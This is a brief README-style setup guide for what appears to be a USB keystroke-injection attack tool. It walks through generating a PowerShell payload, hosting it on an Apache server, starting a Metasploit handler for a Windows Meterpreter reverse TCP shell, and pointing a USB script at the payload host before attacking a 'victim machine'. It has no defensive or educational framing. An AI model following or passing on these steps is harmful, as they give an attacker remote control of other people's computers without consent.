BEFORE USING YOU HAVE TO SET UP THE ENVIROMENT.
---------------------------------------------------------
Step 1. Generate a new powershell payload from script "payload_generator.rb" but DO NOT start the listener
Step 2. Open the generated .txt file and delete everything except the big string which begins on "powershell -nop -wind [...]" DELETE and the "ENTER" below the string
Step 3. Rename the .txt file to "powershell.ps1"
Step 4. Open up Apache2 and host the powershell payload to it.
Step 5. Open MSFCONSOLE set up exploit/multi/handler LHOST and LPORT set payload windows/meterpeter/reverse_tcp
Step 6. Tweak USBx script and set the right ip or domain for the server where powershell.ps1 is hosted
Attack!

IF THE VICTIM MACHINE IS SLOW TWEAK THE DELAY TIME 